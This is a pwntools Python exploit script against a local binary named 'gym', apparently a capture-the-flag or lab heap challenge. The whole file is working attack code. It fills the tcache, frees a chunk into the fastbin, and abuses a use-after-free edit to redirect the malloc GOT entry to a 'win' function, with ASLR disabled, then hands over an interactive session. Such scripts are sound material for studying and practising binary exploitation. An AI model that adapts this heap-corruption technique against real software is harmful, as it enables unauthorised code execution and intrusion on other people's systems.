#!/usr/bin/python3
# ./attack.py GDB or ./attack.py
# To disable ASLR, run this first: setarch `uname -m` -R /bin/bash

from pwn import process, gdb, args, p64, ELF, context

binary = './gym'

gs = """
break main
break act_edit
continue
"""

e = ELF(binary)

context.aslr = False

END_OF_MENU = "e.g, l\n"


def malloc(p, size=8):
    p.sendline(b"m %d" % size)
    print("m %d" % size)
    print(p.recvuntil(END_OF_MENU).decode())


def free(p, index):
    p.sendline(b"f %d" % index)
    print("free")
    print(p.recvuntil(END_OF_MENU).decode())


def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    print(b"e %d %b" % (index, content))
    print(p.recvuntil(END_OF_MENU).decode())


def exit(p):
    p.sendline(b"0")


def list_ptr(p):
    p.sendline(b"l")
    print(p.recvuntil(END_OF_MENU).decode())


def get_smallbin(p, base):
    for _ in range(8):
        malloc(p, 0x90)

    for i in range(8):
        free(p, i + base)


def launch_attack(p):
    # 1. fill tcache
    for _ in range(9):
        malloc(p)
    for i in range(7):
        free(p, i)
    # 2. free two chunks and put them into fastbin
    free(p, 7)
    # free(p, 8)

    # get_smallbin(p, 9)
    # 3. trigger use after free

    # we wanna get the address of __malloc_hook
    malloc_hook_addr = 0x155555326c30
    # malloc_hook_addr_gdb = 0x00007ffff7dcfc30
    # if pie is on, then got cannot be used
    # test = 0x602240
    # edit(p, 7, p64(malloc_hook_addr - 0x10))
    edit(p, 7, p64(e.got["malloc"] - 0x10))

    # 4. get the victim pointer
    for _ in range(7):
        malloc(p)

    list_ptr(p)
    print("Attacking...")
    # index: 9 + 7 = 16
    malloc(p)
    # index: 10 + 7 = 17
    malloc(p)


    # edit the victim pointer
    edit(p, 17, p64(e.symbols.win))

    # TRIGGER
    p.interactive()
    # p.sendline(b"m 8")
    # p.recvline()
    # print(p.recvline())


def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = process(binary, aslr=False)

    p.recvuntil(END_OF_MENU)
    launch_attack(p)

    # Make sure that this is kept for gdb
    # p.interactive()


if __name__ == "__main__":
    main()
